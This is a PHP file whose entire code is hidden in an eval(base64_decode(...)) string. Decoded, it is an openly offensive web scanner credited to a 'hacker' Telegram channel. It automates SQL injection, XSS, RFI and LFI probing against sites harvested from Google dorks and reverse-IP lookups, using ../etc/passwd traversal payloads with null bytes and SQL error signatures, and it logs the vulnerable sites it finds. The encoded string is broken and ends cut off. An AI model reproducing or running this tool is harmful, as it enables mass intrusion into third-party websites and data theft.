<?php

eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwoKU3RhcnQoKTsKCmZ1bmN0aW9uIFN0YXJ0KCkgewogICAgCiAgICAkbGlzdF9jb21tYW5kID0gYXJyYXkoJ2hlbHAnLCdzcWwnLCdyZmknLCdsZmknLCd4c3MnLCdmdWxsJywnZ29vZ2xlJywnZ2V0bGlzdCcsJ2p1bXAnLCdleHBsb2l0Jywnd2dldCcsJ3F1aXQnLCAncG1hcHduJywnaW5qZWN0b3InLCdoZXhzdHJpbmcnLCdtZDVzdHJpbmcnLCdwb3J0c2NhbicpOwogICAgCiAgICBwcmludCBMb2dvKCk7CiAgICBUaXBzKCk7CiAgICB3aGlsZSgxKSB7CiAgICAgICAgZndyaXRlKFNURE9VVCwgIlxuLVNjYW5uZXIkOiAiKTsKICAgICAgICAkY21kID0gdHJpbShmZ2V0cyhTVERJTikpOwogICAgICAgIGlmKCRjbWQgPT0gJ2Z1bGwnKSB7CiAgICAgICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1TSVRFOiAiKTsKICAgICAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgICAgIGlmKGVtcHR5KCRzaXRlKSkgewogICAgICAgICAgICAgICAgcHJpbnQgIltFcnJvcl1QbGVhc2UgZW50ZXIgc2l0ZSBVUkxcbiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZ1bGwoJHNpdGUpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICBpZihpbl9hcnJheSgkY21kLCAkbGlzdF9jb21tYW5kKSkgewogICAgICAgICRjbWQoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICJbRXJyb3JdQ29tbWFuZCBub3QgZm91bmRcbiI7CiAgICAgICAgICAgIFRpcHMoKTsKICAgICAgICB9CiAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIExvZ28oKSB7CgokdGV4dCAuPSAifCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKnxcbiI7CiR0ZXh0IC49ICIgICAgICAgIHNjYW5uZXIgdG9vbCBjb2RlZCBieSDhl7Dhnarhlbzhl6nhl7Dhl6nhl55cbiI7CiR0ZXh0IC49ICIgICAgICAgIHdlIGNoYW5uZWwgb24gIHRlbGVncmFtIDogdC5tZS9IYUNLZXIxNTU1NTIzMjNcbiI7CiR0ZXh0IC49ICIgICAgICAgIFlvdXR1YmUgOiBZb3VyIEd1aWRlIFRvIFsgSGFDa2VSIF1cbiI7CiR0ZXh0IC49ICIgICAgICAgIGlmIHRoaXMgdG9vbCBoYXZlIGFueSBwcm9ibGVtcyBjb250YWN0IHVzwqBncm91cCBjaGF0IDogdC5tZS9RS0FLQVJPVE9cbiI7CiR0ZXh0IC49ICIgICAgICAgIDIwLzQvMjAyMFxuIjsKJHRleHQgLj0gInwqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKip8XG4iOwokdGV4dCAuPSAiXG4iOwpwcmludCAkdGV4dDsKfQoKCmZ1bmN0aW9uIEhlbHAoKSB7CgokdGV4dCAuPSAiW3NxbF0gLS0tLS0tLS0+IFNjYW4gU1FMIEluamVjdGlvbiB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3hzc10gLS0tLS0tLS0+IFNjYW4gWFNTKGNyb3NzIHNpdGUgc2NyaXB0aW5nKSB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3JmaV0gLS0tLS0tLS0+IFNjYW4gUkZJKHJlbW90ZSBmaWxlIGluY2x1ZGUpIHZ1bG5lcmFibGVcbiI7CiR0ZXh0IC49ICJbbGZpXSAtLS0tLS0tLT4gU2NhbiBMRkkobG9jYWwgZmlsZSBpbmNsdWRlKSB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3BtYXB3bl0gLS0tLS0+IFNjYW4gcGhwTXlBZG1pbiBjb2RlIGluamVjdGlvbiB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW2Z1bGxdIC0tLS0tLS0+IEdyYWIgbGluayBmcm9tIHdlYnNpdGUgYW5kIHN0YXJ0IGFsbCBzY2FuXG4iOwokdGV4dCAuPSAiW2dvb2dsZV0gLS0tLS0+IEdyYWIgd2Vic2l0ZSBmcm9tIGdvb2dsZSBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbZ2V0bGlzdF0gLS0tLT4gR3JhYiB3ZWJzaXRlIGZyb20gZmlsZSBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbanVtcF0gLS0tLS0tLT4gRmluZCBhbGwgc2l0ZSBob3N0ZWQgb24gc2FtZSBpcCBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbZXhwbG9pdF0gLS0tLT4gRXhwbG9pdC1EQiBFeHBsb2l0IEZpbmRlclxuIjsKJHRleHQgLj0gIltpbmplY3Rvcl0gLS0tPiBBdXRvbWF0aWMgU1FMIEluamVjdG9yLCB3b3JrIGZvciB2NCBhbmQgdjVcbiI7CiR0ZXh0IC49ICJbaGV4c3RyaW5nXSAtLT4gQ29udmVydCBzdHJpbmcgdG8gaGV4ICh1c2VmdWwgZm9yIHNxbCBpbmplY3Rpb24pXG4iOwokdGV4dCAuPSAiW21kNXN0cmluZ10gLS0+IENvbnZlcnQgc3RyaW5nIHRvIE1ENSBIYXNoXG4iOwokdGV4dCAuPSAiW3BvcnRzY2FuXSAtLT4gQ2hlY2sgcG9ydCBvcGVuIGFuZCBjbG9zZVxuIjsKJHRleHQgLj0gIlt3Z2V0XSAtLS0tLS0tPiBHZXQgZmlsZSBmcm9tIFVSTFxuIjsKcHJpbnQgJHRleHQ7Cn0KCmZ1bmN0aW9uIFRpcHMoKSB7CiAgICBwcmludCAiW1RpcHNdIEZvciBoZWxwLCB0eXBlICdoZWxwJyBhbmQgdG8gcXVpdCBwbGVhc2UgdHlwZSAncXVpdCdcbiI7Cn0KCmZ1bmN0aW9uIGZ1bGwoJHNpdGUpIHsKICAgIHByaW50ICJbLV0gU3RhcnQgZnVsbCBzY2FubmluZyBtb2RlLlxuIjsKICAgIHBtYXB3bigkc2l0ZSwgMSk7CiAgICBwcmludCAiWy1dIFN0YXJ0IFNRTCBJbmplY3Rpb24gU2NhblxuIjsKICAgIHNxbCgkc2l0ZSwgMSk7CiAgICBwcmludCAiWy1dIFN0YXJ0IFhTUyBTY2FuXG4iOwogICAgeHNzKCRzaXRlLCAxKTsKICAgIHByaW50ICJbLV0gU3RhcnQgUkZJIFNjYW5cbiI7CiAgICByZmkoJHNpdGUsIDEpOwogICAgcHJpbnQgIlstXSBTdGFydCBMRkkgU2NhblxuIjsKICAgIGxmaSgkc2l0ZSwgMSk7Cn0KCmZ1bmN0aW9uIGhleHN0cmluZygpIHsKICAgIGZ3cml0ZShTVERPVVQsICItU3RyaW5nOiAiKTsKICAgICRzdHJpbmcgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBwcmludCAiWy1dIFN0cmluZzogJHN0cmluZ1xuIjsKICAgIHByaW50ICJbLV0gSGV4OiAiLkhleFZhbHVlKCRzdHJpbmcpLiJcbiI7Cn0KCmZ1bmN0aW9uIHBvcnRzY2FuKCkgewogICAgZndyaXRlKFNURE9VVCwgIi1JUC9Eb21haW46ICIpOwogICAgJGhvc3QgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBmd3JpdGUoU1RET1VULCAiLVN0YXJ0IFBvcnQ6ICIpOwogICAgJHNwb3J0ID0gdHJpbShmZ2V0cyhTVERJTikpOwogICAgZndyaXRlKFNURE9VVCwgIi1FbmQgUG9ydDogIik7CiAgICAkZXBvcnQgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBwcmludCAiWy1dIElQL0RvbWFpbiA6ICRob3N0XG4iOwogICAgJHNwb3J0ID0gaW50dmFsKCRzcG9ydCk7CiAgICAkZXBvcnQgPSBpbnR2YWwoJGVwb3J0KTsKICAgIHByaW50ICJbLV0gQ2hlY2tpbmcuLi5cbiI7CiAgICBmb3IoJGkgPSAkc3BvcnQ7ICRpIDw9ICRlcG9ydDsgJGkrKykgewogICAgICAgICRjaGVjayA9IEBmc29ja29wZW4oJGhvc3QsICRpLCAkZXJybm8sICRlcnJzdHIsIDMpOwogICAgICAgIGlmKCRjaGVjaykgewogICAgICAgICAgICBwcmludCAiWy1dIFBvcnQgJyRpJyBpcyBvcGVuXG4iOwogICAgICAgIH0KICAgIH0KICAgIHByaW50ICJbLV0gRG9uZVxuIjsKfQoKZnVuY3Rpb24gbWQ1c3RyaW5nKCkgewogICAgZndyaXRlKFNURE9VVCwgIi1TdHJpbmc6ICIpOwogICAgJHN0cmluZyA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgIHByaW50ICJbLV0gU3RyaW5nOiAkc3RyaW5nXG4iOwogICAgcHJpbnQgIlstXSBNRDU6ICIubWQ1KCRzdHJpbmcpLiJcbiI7Cn0KCgpmdW5jdGlvbiBqdW1wKCkgewoJcHJpbnQgIkV4YW1wbGU6IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIjsgIAogICAgICAgIGZ3cml0ZShTVERPVVQsICItU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgICRqdW1wX3NpdGUgPSAiaHR0cDovL3d3dy5pcC1hZHJlc3MuY29tL3JldmVyc2VfaXAvJHJlcXVlc3RbaG9zdF0iOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFNlcnZlciBJUDogIi5nZXRob3N0YnluYW1lKCRyZXF1ZXN0Wydob3N0J10pLiJcbiI7CiAgICAgICAgcHJpbnQgIlstXSBHZXQgbGlzdCBkb21haW4gaG9zdGVkIG9uIHRoZSBpcC4uLlxuIjsKICAgICAgICAkbGlzdCA9IGNvbl9ob3N0KCRqdW1wX3NpdGUpOwogICAgICAgIHByZWdfbWF0Y2hfYWxsKCIvPGEgaHJlZj1cIlwvd2hvaXNcLyguKj8pXCI+V2hvaXM8XC9hPi8iLCRsaXN0LCAkbGlua3MpOwogICAgICAgIHByaW50ICJbLV0gVG90YWwgc2l0ZSBob3N0ZWQgb24gIi4kcmVxdWVzdFsnaG9zdCddLiIgOiAiLmNvdW50KCRsaW5rc1sxXSkuIlxuIjsKICAgICAgICBmb3JlYWNoKCRsaW5rc1sxXSBhcyAkbGluaykgewogICAgICAgICRsaW5rID0gImh0dHA6Ly8iLiRsaW5rOwogICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdkb21haW5fbGlzdC50eHQnLCIkbGlua1xuIixGSUxFX0FQUEVORCk7CiAgICAgICAgfQogICAgICAgIHByaW50ICJbLV0gRG9tYWluIGxpc3Qgc2F2ZWQgdG8gJ2RvbWFpbl9saXN0LnR4dCdcbiI7CiAgICAgICAgZm9yZWFjaCgkbGlua3NbMV0gYXMgJGxpbmspIHsKICAgICAgICAkbGluayA9ICJodHRwOi8vIi4kbGluazsKICAgICAgICBmdWxsKCRsaW5rKTsKICAgICAgICBqb29tbGEoJGxpbmspOwogICAgICAgIH0gICAgICAgIAp9CgoKCmZ1bmN0aW9uIGdvb2dsZSgpIHsKICBmd3JpdGUoU1RET1VULCAiLURPUks6ICIpOwogICRkb3JrID0gdHJpbShmZ2V0cyhTVERJTikpOwogIHByaW50ICJbLV0gRG9yazogJGRvcmtcbiI7CiAgcHJpbnQgIlstXSBTdGFydCBnb29nbGUgc2Nhbm5pbmcuLi5cbiI7CiAgJHRvdGFsID0gMDsKICBmb3IoJGkgPSAwOyRpIDwgMTA7JGkrKykgewogICAgJGZwID0gImh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L3NlcnZpY2VzL3NlYXJjaC93ZWI/dj0xLjAmcnN6PWxhcmdlJnN0YXJ0PSRpJnE9Ii4kZG9yazsKCiAgICAkYm9keSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmcCk7CiAgICAkanNvbiA9IGpzb25fZGVjb2RlKCRib2R5KTsKCiAgICBmb3IoJHggPSAwOyR4IDwgY291bnQoJGpzb24tPnJlc3BvbnNlRGF0YS0+cmVzdWx0cyk7JHgrKykgewogICAgICAkcmVhbCA9IHVybGRlY29kZSgkanNvbi0+cmVzcG9uc2VEYXRhLT5yZXN1bHRzWyR4XS0+dXJsKTsKICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2RvbWFpbl9saXN0LnR4dCcsICIkcmVhbFxuIixGSUxFX0FQUEVORCk7CiAgICAgICR0b3RhbCsrOwogICAgfQogIH0KICBwcmludCAiWy1dIERvbWFpbiBsaXN0IHNhdmVkIHRvICdkb21haW5fbGlzdC50eHQnXG4iOwogIHByaW50ICJbK10gVG90YWwgc2l0ZSBmb3VuZDogJHRvdGFsXG4iOwogICRkb21haW4gPSBmaWxlKCdkb21haW5fbGlzdC50eHQnKTsKICBmb3JlYWNoKCRkb21haW4gYXMgJGxpbmUpIHsKICAgIGZ1bGwoJGxpbmUpOwogIH0KfQoKZnVuY3Rpb24gZ2V0bGlzdCgpIHsKICAgIGZ3cml0ZShTVERPVVQsICItRklMRTogIik7CiAgICAkZ2V0ZmlsZSA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICRoYW5kbGUgPSBmb3BlbigkZ2V0ZmlsZSwgInIiKTsKd2hpbGUgKCFmZW9mKCRoYW5kbGUpKSB7CiAgICAkbGluZSA9IGZnZXRzKCRoYW5kbGUpOwogICAgJHRyeSA9IHRyaW0oJGxpbmUpOwogICAgZnVsbCgkdHJ5KTsKICAgIH0KZmNsb3NlKCRoYW5kbGUpOwp9CgpmdW5jdGlvbiBqb29tbGEoJHNpdGUpIHsKICAgIGlmKCRjb250ZW50ID0gY29uX2hvc3QoJHNpdGUpKSB7CiAgICAgICAgaWYocHJlZ19tYXRjaCgiL29wdGlvbj1jb21fLyIsICRjb250ZW50KSkgewogICAgICAgICAgICBwcmludCAiWy1dIEpvb21sYSBzaXRlIGZvdW5kOiAkc2l0ZVxuIjsKICAgICAgICB9CiAgICB9IAp9CgpmdW5jdGlvbiBsZmkoJHNpdGUgPSAnJywgJGZ1bGwgPSAnMCcpIHsKICAgICRsaXN0X2xmaSA9IGFycmF5KAogICAgICAgICcuLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi8uLi8uLi8uLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgICAgICcuLi8uLi8uLi8uLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgICAgICcuLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgKTsKICAgICAgICBpZigkZnVsbCA9PSAnMCcpIHsKICAgICAgICBmd3JpdGUoU1RET1VULCAiXG4tU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHNpdGUgPSAkc2l0ZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFRyeSBjb25uZWN0IHRvIGhvc3RcbiI7CiAgICAgICAgJHVybCA9ICIiLiRyZXF1ZXN0WydzY2hlbWUnXS4iOi8vIi4kcmVxdWVzdFsnaG9zdCddLiRyZXF1ZXN0WydwYXRoJ10uIiI7CiAgICAgICAgaWYoY29uX2hvc3QoJHVybCkpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAiWytdIENvbm5lY3QgdG8gaG9zdCBzdWNjZXNzZnVsXG4iOwogICAgICAgICAgICBwcmludCBHZXRfSW5mbygkdXJsKTsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIGxpbmsgb24gdGhlIHdlYnNpdGVcbiI7CiAgICAgICAgICAgIHByaW50ICJbK10gRm91bmQgbGluayA6ICIuY291bnQoZmluZF9saW5rKCR1cmwpKS4iXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEZpbmRpbmcgdnVsbmVyYWJsZS4uLlxuIjsKICAgICAgICAgICAgaWYoaXNfYXJyYXkoZmluZF9saW5r

KCR1cmwpKSkKICAgICAgICAgICAgZm9yZWFjaChmaW5kX2xpbmsoJHVybCkgYXMgJGxpbmspIHsKICAgICAgICAgICAgICAgICRmaWxlID0gZXhwbG9kZSgiLyIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgJHJlcXVlc3RbJ3BhdGgnXSA9IHByZWdfcmVwbGFjZSgiLyIuJGZpbGVbY291bnQoJGZpbGUpLTFdLiIvIiwgIiIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgaWYoIXByZWdfbWF0Y2goIi8kcmVxdWVzdFtob3N0XS8iLCAkbGluaykpIHsgJGxpbmsgPSAiaHR0cDovLyRyZXF1ZXN0W2hvc3RdLyRyZXF1ZXN0W3BhdGhdJGxpbmsiOyB9CiAgICAgICAgICAgICAgICBmb3JlYWNoKCRsaXN0X2xmaSBhcyAkZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAkbGluayA9IHByZWdfcmVwbGFjZSgiLz0oLispLyIsICI9JGVycm9yIiwgJGxpbmspOwogICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9yb290Ong6LyIsIGNvbl9ob3N0KCRsaW5rKSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlstXUxGSSB2dWxuZXJhYmxlIDogJGxpbmtcbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICRzYXZlW10gPSAkbGluazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcHJpbnQgIlstXSBEb25lXG4iOwogICAgICAgICAgICBpZihpc19hcnJheSgkc2F2ZSkpIHsKICAgICAgICAgICAgICAgZm9yZWFjaCgkc2F2ZSBhcyAkbGluaykgewogICAgICAgICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygndnVsbmVyYWJsZS5sb2cnLCAiIi4kbGluay4iXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgICAgICAgICB9fQogICAgICAgICAgICAgICBwcmludCAiWytdIFNlZSAndnVsbmVyYWJsZS5sb2cnIGZvciB2dWxuZXJhYmxlIGxpc3RcbiI7CiAgICB9CiAgfQoKCmZ1bmN0aW9uIHNxbCgkc2l0ZSA9ICcnLCAkZnVsbCA9ICcwJykgewogICAgJHNxbF9lcnJvciA9IGFycmF5KAogICAgICAgICdZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCcsCiAgICAgICAgJ0RpdmlzaW9uIGJ5IHplcm8gaW4nLAogICAgICAgICdzdXBwbGllZCBhcmd1bWVudCBpcyBub3QgYSB2YWxpZCBNeVNRTCByZXN1bHQgcmVzb3VyY2UgaW4nLAogICAgICAgICdDYWxsIHRvIGEgbWVtYmVyIGZ1bmN0aW9uJywKICAgICAgICAnTWljcm9zb2Z0IEpFVCBEYXRhYmFzZScsJ09EQkMgTWljcm9zb2Z0IEFjY2VzcyBEcml2ZXInLAogICAgICAgICdNaWNyb3NvZnQgT0xFIERCIFByb3ZpZGVyIGZvciBTUUwgU2VydmVyJywKICAgICAgICAnVW5jbG9zZWQgcXVvdGF0aW9uIG1hcmsnLAogICAgICAgICdNaWNyb3NvZnQgT0xFIERCIFByb3ZpZGVyIGZvciBPcmFjbGUnLAogICAgICAgICdbTWFjcm9tZWRpYV1bU1FMU2VydmVyIEpEQkMgRHJpdmVyXVtTUUxTZXJ2ZXJdSW5jb3JyZWN0JywKICAgICAgICAnSW5jb3JyZWN0IHN5bnRheCBuZWFyJwogICAgKTsKICAgICAgICBpZigkZnVsbCA9PSAnMCcpIHsKICAgICAgICBmd3JpdGUoU1RET1VULCAiXG4tU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHNpdGUgPSAkc2l0ZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFRyeSBjb25uZWN0IHRvIGhvc3RcbiI7CiAgICAgICAgJHVybCA9ICIiLiRyZXF1ZXN0WydzY2hlbWUnXS4iOi8vIi4kcmVxdWVzdFsnaG9zdCddLiRyZXF1ZXN0WydwYXRoJ10uIiI7CiAgICAgICAgaWYoY29uX2hvc3QoJHVybCkpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAiWy1dIENvbm5lY3QgdG8gaG9zdCBzdWNjZXNzZnVsXG4iOwogICAgICAgICAgICBwcmludCBHZXRfSW5mbygkdXJsKTsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIGxpbmsgb24gdGhlIHdlYnNpdGVcbiI7CiAgICAgICAgICAgIHByaW50ICJbK10gRm91bmQgbGluayA6ICIuY291bnQoZmluZF9saW5rKCR1cmwpKS4iXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEZpbmRpbmcgdnVsbmVyYWJsZS4uLlxuIjsKICAgICAgICAgICAgaWYoaXNfYXJyYXkoZmluZF9saW5rKCR1cmwpKSkKICAgICAgICAgICAgZm9yZWFjaChmaW5kX2xpbmsoJHVybCkgYXMgJGxpbmspIHsKICAgICAgICAgICAgICAgICRmaWxlID0gZXhwbG9kZSgiLyIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgJHJlcXVlc3RbJ3BhdGgnXSA9IHByZWdfcmVwbGFjZSgiLyIuJGZpbGVbY291bnQoJGZpbGUpLTFdLiIvIiwgIiIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgaWYoIXByZWdfbWF0Y2goIi8kcmVxdWVzdFtob3N0XS8iLCAkbGluaykpIHsgJGxpbmsgPSAiaHR0cDovLyRyZXF1ZXN0W2hvc3RdLyRyZXF1ZXN0W3BhdGhdJGxpbmsiOyB9CiAgICAgICAgICAgICAgICAkbGluayA9IHByZWdfcmVwbGFjZSgiLz0oLispLyIsICI9MSciLCAkbGluayk7CiAgICAgICAgICAgICAgICBmb3JlYWNoKCRzcWxfZXJyb3IgYXMgJGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiLyRlcnJvci8iLCBjb25faG9zdCgkbGluaykpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJbK10gU1FMIEluamVjdGlvbiB2dWxuZXJhYmxlIDogJGxpbmtcbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICRzYXZlW10gPSAkbGluazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcHJpbnQgIlsrXSBEb25lXG4iOwogICAgICAgICAgICBpZihpc19hcnJheSgkc2F2ZSkpIHsKICAgICAgICAgICAgICAgZm9yZWFjaCgkc2F2ZSBhcyAkbGluaykgewogICAgICAgICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygndnVsbmVyYWJsZS5sb2cnLCAiIi4kbGluay4iXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgICAgICAgICB9fQogICAgICAgICAgICAgICBwcmludCAiWy1dIFNlZSAndnVsbmVyYWJsZS5sb2cnIGZvciB2dWxuZXJhYmxlIGxpc3RcbiI7CiAgICB9CiAgfQogIAoKZnVuY3Rpb24gcmZpKCRzaXRlID0gJycsICRmdWxsID0gJzAnKSB7CiAgICAKICAgICAgICBpZigkZnVsbCA9PSAnMCcpIHsKICAgICAgICBmd3JpdGUoU1RET1VULCAiXG4tU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHNpdGUgPSAkc2l0ZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFRyeSBjb25uZWN0IHRvIGhvc3RcbiI7CiAgICAgICAgJHVybCA9ICIiLiRyZXF1ZXN0WydzY2hlbWUnXS4iOi8vIi4kcmVxdWVzdFsnaG9zdCddLiRyZXF1ZXN0WydwYXRoJ10uIiI7CiAgICAgICAgaWYoY29uX2hvc3QoJHVybCkpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAiWy1dIENvbm5lY3QgdG8gaG9zdCBzdWNjZXNzZnVsXG4iOwogICAgICAgICAgICBwcmludCBHZXRfSW5mbygkdXJsKTsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIGxpbmsgb24gdGhlIHdlYnNpdGVcbiI7CiAgICAgICAgICAgIHByaW50ICJbK10gRm91bmQgbGluayA6ICIuY291bnQoZmluZF9saW5rKCR1cmwpKS4iXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEZpbmRpbmcgdnVsbmVyYWJsZS4uLlxuIjsKICAgICAgICAgICAgaWYoaXNfYXJyYXkoZmluZF9saW5rKCR1cmwpKSkKICAgICAgICAgICAgZm9yZWFjaChmaW5kX2xpbmsoJHVybCkgYXMgJGxpbmspIHsKICAgICAgICAgICAgICAgICRmaWxlID0gZXhwbG9kZSgiLyIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgJHJlcXVlc3RbJ3BhdGgnXSA9IHByZWdfcmVwbGFjZSgiLyIuJGZpbGVbY291bnQoJGZpbGUpLTFdLiIvIiwgIiIsICRyZXF1ZXN0WydwYXRoJ10pOwogICAgICAgICAgICAgICAgaWYoIXByZWdfbWF0Y2goIi8kcmVxdWVzdFtob3N0XS8iLCAkbGluaykpIHsgJGxpbmsgPSAiaHR0cDovLyRyZXF1ZXN0W2hvc3RdLyRyZXF1ZXN0W3BhdGhdJGxpbmsiOyB9CiAgICAgICAgICAgICAgICAkbGluayA9IHByZWdfcmVwbGFjZSgiLz0oLispLyIsICI9aHR0cDovL2dvb2dsZS5jb20vaW5kZXguaHRtbD8iLCAkbGluayk7CiAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvQWR2ZXJ0aXNpbmcmbmJzcDtQcm9ncmFtcy8iLCBjb25faG9zdCgkbGluaykpKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiWytdIFJGSSB2dWxuZXJhYmxlIDogJGxpbmtcbiI7CiAgICAgICAgICAgICAgICAgICAgJHNhdmVbXSA9ICRsaW5rOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgcHJpbnQgIlsrXSBEb25lXG4iOwogICAgICAgICAgIGlmKGlzX2FycmF5KCRzYXZlKSkgewogICAgICAgICAgIGZvcmVhY2goJHNhdmUgYXMgJGxpbmspIHsKICAgICAgICAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5lcmF